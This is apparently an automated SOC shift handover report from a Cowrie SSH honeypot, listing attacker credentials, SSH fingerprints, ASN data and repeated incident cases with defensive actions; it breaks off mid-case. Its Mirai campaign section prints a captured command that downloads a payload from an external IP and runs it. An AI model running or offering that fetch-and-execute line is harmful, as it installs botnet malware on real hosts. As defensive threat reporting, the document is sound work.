# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-22 |
| **Generated At** | 2026-08-22T06:45:10Z |
| **Shift Time** | 06:45 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **116** |
| Confirmed Threats | **87** |
| False Positives Filtered | **29** (25.0%) |
| Unique Attacker IPs | **71** |
| Countries of Origin | **33** |
| High Severity Cases | **63** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **53** |
| Malware Samples Analyzed | **3** HIGH · **17** MED · 24 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **86** |
| Unique Credential Pairs | **40** |
| Unique Usernames | **13** |
| Unique Passwords | **39** |
| Successful Auth Pairs | **73** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 17 |
| `ubuntu` | 12 |
| `guest` | 8 |
| `unknown` | 7 |
| `support` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `centos2002` | 6 |
| `debian2025` | 6 |
| `ubuntu` | 6 |
| `guest2006` | 6 |
| `ubnt2010` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `centos` | `centos2002` | 6 |
| `debian` | `debian2025` | 6 |
| `unknown` | `ubuntu` | 6 |
| `guest` | `guest2006` | 6 |
| `ubnt` | `ubnt2010` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `unknown` | `admin` | `76.132.238.43` | 2026-08-22T02:57:16 |
| `test` | `test2019` | `183.16.166.59` | 2026-08-22T02:58:37 |
| `test` | `test2019` | `1.247.245.61` | 2026-08-22T02:58:45 |
| `ubuntu` | `P@ssw0rd2` | `217.60.255.130` | 2026-08-22T03:00:49 |
| `root` | `Server@123` | `217.60.255.130` | 2026-08-22T03:00:53 |
| `nobody` | `nobody2025` | `65.20.134.97` | 2026-08-22T03:03:40 |
| `nobody` | `nobody2025` | `206.189.109.51` | 2026-08-22T03:03:51 |
| `support` | `support2020` | `180.71.9.31` | 2026-08-22T03:05:44 |
| `support` | `support2020` | `49.205.214.47` | 2026-08-22T03:05:55 |
| `support` | `support2020` | `213.149.216.10` | 2026-08-22T03:06:02 |
| `ubuntu` | `Navid@123` | `217.60.255.130` | 2026-08-22T03:10:34 |
| `ubnt` | `ubnt2010` | `10.0.0.73` | 2026-08-22T03:12:41 |
| `ubnt` | `ubnt2010` | `31.173.8.170` | 2026-08-22T03:14:15 |
| `ubnt` | `ubnt2010` | `195.222.57.190` | 2026-08-22T03:14:22 |
| `nobody` | `nobody2025` | `10.0.0.73` | 2026-08-22T03:14:48 |
| `ubuntu` | `tic@123` | `217.60.255.130` | 2026-08-22T03:20:14 |
| `root` | `12345678900` | `217.60.255.130` | 2026-08-22T03:20:19 |
| `centos` | `centos2002` | `10.0.0.73` | 2026-08-22T03:20:38 |
| `ubnt` | `ubnt2010` | `60.172.1.210` | 2026-08-22T03:29:49 |
| `ubuntu` | `Navid123` | `217.60.255.130` | 2026-08-22T03:30:12 |
| `root` | `Mohammad@123` | `217.60.255.130` | 2026-08-22T03:30:15 |
| `support` | `support` | `176.53.159.196` | 2026-08-22T03:34:22 |
| `debian` | `debian2025` | `42.98.224.88` | 2026-08-22T03:36:05 |
| `debian` | `debian2025` | `95.85.224.75` | 2026-08-22T03:36:12 |
| `centos` | `centos2002` | `182.93.95.214` | 2026-08-22T03:38:14 |
| `centos` | `centos2002` | `31.173.8.170` | 2026-08-22T03:38:22 |
| `centos` | `centos2002` | `194.59.245.3` | 2026-08-22T03:38:25 |
| `centos` | `centos2002` | `210.0.90.82` | 2026-08-22T03:38:34 |
| `ubuntu` | `Diba@123` | `217.60.255.130` | 2026-08-22T03:39:56 |
| `root` | `Youssof@123` | `217.60.255.130` | 2026-08-22T03:40:00 |
| `root` | `admin` | `45.198.224.26` | 2026-08-22T03:44:55 |
| `unknown` | `ubuntu` | `10.0.0.73` | 2026-08-22T03:45:11 |
| `unknown` | `ubuntu` | `222.186.68.153` | 2026-08-22T03:46:45 |
| `unknown` | `ubuntu` | `217.60.33.67` | 2026-08-22T03:46:57 |
| `debian` | `debian2025` | `10.0.0.73` | 2026-08-22T03:47:13 |
| `ubuntu` | `aA123456` | `217.60.255.130` | 2026-08-22T03:49:49 |
| `root` | `Omar@123` | `217.60.255.130` | 2026-08-22T03:49:54 |
| `blank` | `blank2007` | `10.0.0.73` | 2026-08-22T03:53:15 |
| `support` | `support` | `10.0.0.73` | 2026-08-22T03:53:57 |
| `ubuntu` | `Root12345` | `217.60.255.130` | 2026-08-22T03:59:42 |
| `root` | `Raed@123` | `217.60.255.130` | 2026-08-22T03:59:45 |
| `unknown` | `ubuntu` | `106.153.181.80` | 2026-08-22T04:02:11 |
| `unknown` | `ubuntu` | `110.227.215.90` | 2026-08-22T04:02:19 |
| `debian` | `debian2025` | `200.139.93.67` | 2026-08-22T04:03:45 |
| `debian` | `debian2025` | `58.215.243.6` | 2026-08-22T04:03:54 |
| `root` | `root2017` | `65.20.146.109` | 2026-08-22T04:08:42 |
| `ubuntu` | `Oracle123!@#` | `217.60.255.130` | 2026-08-22T04:09:23 |
| `root` | `Root@123` | `217.60.255.130` | 2026-08-22T04:09:26 |
| `blank` | `blank2007` | `35.234.169.119` | 2026-08-22T04:10:58 |
| `blank` | `blank2007` | `95.153.108.140` | 2026-08-22T04:11:10 |
| `operator` | `operator2006` | `10.0.0.73` | 2026-08-22T04:17:46 |
| `ubuntu` | `1Q2w3e4r5t` | `217.60.255.130` | 2026-08-22T04:19:13 |
| `root` | `Aa1234` | `217.60.255.130` | 2026-08-22T04:19:17 |
| `operator` | `operator2006` | `175.101.14.77` | 2026-08-22T04:19:27 |
| `root` | `root2017` | `10.0.0.73` | 2026-08-22T04:19:48 |
| `guest` | `guest2006` | `10.0.0.73` | 2026-08-22T04:26:06 |
| `ubuntu` | `12345678aA` | `217.60.255.130` | 2026-08-22T04:29:03 |
| `root` | `Aa@123456789` | `217.60.255.130` | 2026-08-22T04:29:07 |
| `operator` | `operator2006` | `103.7.60.253` | 2026-08-22T04:34:51 |
| `operator` | `operator2006` | `117.2.123.19` | 2026-08-22T04:35:01 |
| `root` | `root2017` | `187.115.144.103` | 2026-08-22T04:36:20 |
| `ubuntu` | `Access@123` | `217.60.255.130` | 2026-08-22T04:38:45 |
| `root` | `Qwer1234` | `217.60.255.130` | 2026-08-22T04:38:49 |
| `guest` | `guest2010` | `61.184.128.210` | 2026-08-22T04:41:33 |
| `guest` | `guest2006` | `220.246.33.79` | 2026-08-22T04:43:51 |
| `guest` | `guest2006` | `211.58.176.42` | 2026-08-22T04:44:00 |
| `guest` | `guest2006` | `112.26.99.93` | 2026-08-22T04:44:07 |
| `guest` | `guest2006` | `175.206.1.60` | 2026-08-22T04:44:16 |
| `ubuntu` | `Bb123` | `217.60.255.130` | 2026-08-22T04:48:27 |
| `root` | `1234abcd` | `217.60.255.130` | 2026-08-22T04:48:31 |
| `default` | `default2004` | `10.0.0.73` | 2026-08-22T04:50:23 |
| `default` | `default2004` | `61.12.86.90` | 2026-08-22T04:51:46 |
| `guest` | `guest2010` | `10.0.0.73` | 2026-08-22T04:52:46 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **116** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 37 |
| libssh | 33 |
| Go SSH scanner | 4 |
| PuTTY | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 37 | 35 |
| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |
| `5bd26477da54...` | Mirai/variant | 1 | 1 |
| `7216c7c47391...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 37 | 35 | Mirai/variant |
| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 9 | 5 | — |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |
| `7216c7c47391...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `45.198.224.26`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **71** |
| Unique ASNs | **58** |
| High-Risk ASNs | **42** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 3 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS18881` | TELEFÔNICA BRASIL S.A | 2 | HIGH |
| `AS4760` | HKT Limited | 2 | HIGH |
| `AS147131` | PT Global Sarana Elektronika | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (63)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-10d1c4f208e9

| Field | Detail |
|---|---|
| **Source IP** | `76.132.238[.]43` |
| **First Seen** | 2026-08-22 02:57 |
| **Last Seen** | 2026-08-22 02:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 02:57:14` | `cowrie.session.connect` |
| `2026-08-22 02:57:14` | `cowrie.client.version` |
| `2026-08-22 02:57:14` | `cowrie.client.kex` |
| `2026-08-22 02:57:16` | `cowrie.login.success` |
| `2026-08-22 02:57:16` | `cowrie.direct-tcpip.request` |
| `2026-08-22 02:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.132.238[.]43` to AbuseIPDB if not already reported
- [ ] Block `76.132.238[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd24bc0a6c3b

| Field | Detail |
|---|---|
| **Source IP** | `183.16.166[.]59` |
| **First Seen** | 2026-08-22 02:58 |
| **Last Seen** | 2026-08-22 02:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 02:58:34` | `cowrie.session.connect` |
| `2026-08-22 02:58:35` | `cowrie.client.version` |
| `2026-08-22 02:58:35` | `cowrie.client.kex` |
| `2026-08-22 02:58:37` | `cowrie.login.success` |
| `2026-08-22 02:58:37` | `cowrie.direct-tcpip.request` |
| `2026-08-22 02:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.16.166[.]59` to AbuseIPDB if not already reported
- [ ] Block `183.16.166[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1e20d98ad83

| Field | Detail |
|---|---|
| **Source IP** | `1.247.245[.]61` |
| **First Seen** | 2026-08-22 02:58 |
| **Last Seen** | 2026-08-22 02:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 02:58:42` | `cowrie.session.connect` |
| `2026-08-22 02:58:43` | `cowrie.client.version` |
| `2026-08-22 02:58:43` | `cowrie.client.kex` |
| `2026-08-22 02:58:45` | `cowrie.login.success` |
| `2026-08-22 02:58:46` | `cowrie.direct-tcpip.request` |
| `2026-08-22 02:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.247.245[.]61` to AbuseIPDB if not already reported
- [ ] Block `1.247.245[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c142f81e1167

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 03:00 |
| **Last Seen** | 2026-08-22 03:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:00:48` | `cowrie.session.connect` |
| `2026-08-22 03:00:48` | `cowrie.client.version` |
| `2026-08-22 03:00:48` | `cowrie.client.kex` |
| `2026-08-22 03:00:49` | `cowrie.login.success` |
| `2026-08-22 03:00:49` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:00:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 03:00:49` | `cowrie.direct-tcpip.data` |
| `2026-08-22 03:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee69d8fc8e28

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 03:00 |
| **Last Seen** | 2026-08-22 03:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:00:52` | `cowrie.session.connect` |
| `2026-08-22 03:00:52` | `cowrie.client.version` |
| `2026-08-22 03:00:52` | `cowrie.client.kex` |
| `2026-08-22 03:00:53` | `cowrie.login.success` |
| `2026-08-22 03:00:53` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:00:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 03:00:54` | `cowrie.direct-tcpip.data` |
| `2026-08-22 03:00:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c3d2e4d612b

| Field | Detail |
|---|---|
| **Source IP** | `65.20.134[.]97` |
| **First Seen** | 2026-08-22 03:03 |
| **Last Seen** | 2026-08-22 03:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:03:39` | `cowrie.session.connect` |
| `2026-08-22 03:03:39` | `cowrie.client.version` |
| `2026-08-22 03:03:39` | `cowrie.client.kex` |
| `2026-08-22 03:03:40` | `cowrie.login.success` |
| `2026-08-22 03:03:41` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.134[.]97` to AbuseIPDB if not already reported
- [ ] Block `65.20.134[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c8081c6688f

| Field | Detail |
|---|---|
| **Source IP** | `206.189.109[.]51` |
| **First Seen** | 2026-08-22 03:03 |
| **Last Seen** | 2026-08-22 03:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:03:50` | `cowrie.session.connect` |
| `2026-08-22 03:03:50` | `cowrie.client.version` |
| `2026-08-22 03:03:50` | `cowrie.client.kex` |
| `2026-08-22 03:03:51` | `cowrie.login.success` |
| `2026-08-22 03:03:51` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:03:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.109[.]51` to AbuseIPDB if not already reported
- [ ] Block `206.189.109[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f62312375efd

| Field | Detail |
|---|---|
| **Source IP** | `180.71.9[.]31` |
| **First Seen** | 2026-08-22 03:05 |
| **Last Seen** | 2026-08-22 03:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:05:41` | `cowrie.session.connect` |
| `2026-08-22 03:05:42` | `cowrie.client.version` |
| `2026-08-22 03:05:42` | `cowrie.client.kex` |
| `2026-08-22 03:05:44` | `cowrie.login.success` |
| `2026-08-22 03:05:45` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:05:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.71.9[.]31` to AbuseIPDB if not already reported
- [ ] Block `180.71.9[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37f2254556e6

| Field | Detail |
|---|---|
| **Source IP** | `49.205.214[.]47` |
| **First Seen** | 2026-08-22 03:05 |
| **Last Seen** | 2026-08-22 03:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:05:53` | `cowrie.session.connect` |
| `2026-08-22 03:05:54` | `cowrie.client.version` |
| `2026-08-22 03:05:54` | `cowrie.client.kex` |
| `2026-08-22 03:05:55` | `cowrie.login.success` |
| `2026-08-22 03:05:56` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.205.214[.]47` to AbuseIPDB if not already reported
- [ ] Block `49.205.214[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-394340d3fa33

| Field | Detail |
|---|---|
| **Source IP** | `213.149.216[.]10` |
| **First Seen** | 2026-08-22 03:06 |
| **Last Seen** | 2026-08-22 03:11 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:06:01` | `cowrie.session.connect` |
| `2026-08-22 03:06:01` | `cowrie.client.version` |
| `2026-08-22 03:06:01` | `cowrie.client.kex` |
| `2026-08-22 03:06:02` | `cowrie.login.success` |
| `2026-08-22 03:06:02` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.149.216[.]10` to AbuseIPDB if not already reported
- [ ] Block `213.149.216[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2694b39e38d8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 03:10 |
| **Last Seen** | 2026-08-22 03:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:10:33` | `cowrie.session.connect` |
| `2026-08-22 03:10:33` | `cowrie.client.version` |
| `2026-08-22 03:10:33` | `cowrie.client.kex` |
| `2026-08-22 03:10:34` | `cowrie.login.success` |
| `2026-08-22 03:10:34` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:10:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 03:10:34` | `cowrie.direct-tcpip.data` |
| `2026-08-22 03:10:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aa50c21a1be

| Field | Detail |
|---|---|
| **Source IP** | `31.173.8[.]170` |
| **First Seen** | 2026-08-22 03:14 |
| **Last Seen** | 2026-08-22 03:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:14:14` | `cowrie.session.connect` |
| `2026-08-22 03:14:14` | `cowrie.client.version` |
| `2026-08-22 03:14:14` | `cowrie.client.kex` |
| `2026-08-22 03:14:15` | `cowrie.login.success` |
| `2026-08-22 03:14:16` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.8[.]170` to AbuseIPDB if not already reported
- [ ] Block `31.173.8[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af6950880777

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]190` |
| **First Seen** | 2026-08-22 03:14 |
| **Last Seen** | 2026-08-22 03:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:14:21` | `cowrie.session.connect` |
| `2026-08-22 03:14:21` | `cowrie.client.version` |
| `2026-08-22 03:14:21` | `cowrie.client.kex` |
| `2026-08-22 03:14:22` | `cowrie.login.success` |
| `2026-08-22 03:14:22` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:14:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]190` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1385d4d0ce6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 03:20 |
| **Last Seen** | 2026-08-22 03:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:20:13` | `cowrie.session.connect` |
| `2026-08-22 03:20:13` | `cowrie.client.version` |
| `2026-08-22 03:20:13` | `cowrie.client.kex` |
| `2026-08-22 03:20:14` | `cowrie.login.success` |
| `2026-08-22 03:20:14` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:20:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 03:20:14` | `cowrie.direct-tcpip.data` |
| `2026-08-22 03:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-561f34d656ab

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 03:20 |
| **Last Seen** | 2026-08-22 03:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:20:18` | `cowrie.session.connect` |
| `2026-08-22 03:20:18` | `cowrie.client.version` |
| `2026-08-22 03:20:18` | `cowrie.client.kex` |
| `2026-08-22 03:20:19` | `cowrie.login.success` |
| `2026-08-22 03:20:19` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:20:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 03:20:19` | `cowrie.direct-tcpip.data` |
| `2026-08-22 03:20:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b60a92cdcc45

| Field | Detail |
|---|---|
| **Source IP** | `60.172.1[.]210` |
| **First Seen** | 2026-08-22 03:29 |
| **Last Seen** | 2026-08-22 03:29 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:29:45` | `cowrie.session.connect` |
| `2026-08-22 03:29:47` | `cowrie.client.version` |
| `2026-08-22 03:29:47` | `cowrie.client.kex` |
| `2026-08-22 03:29:49` | `cowrie.login.success` |
| `2026-08-22 03:29:50` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:29:56` | `cowrie.session.closed` |

**Recommended Actions:**
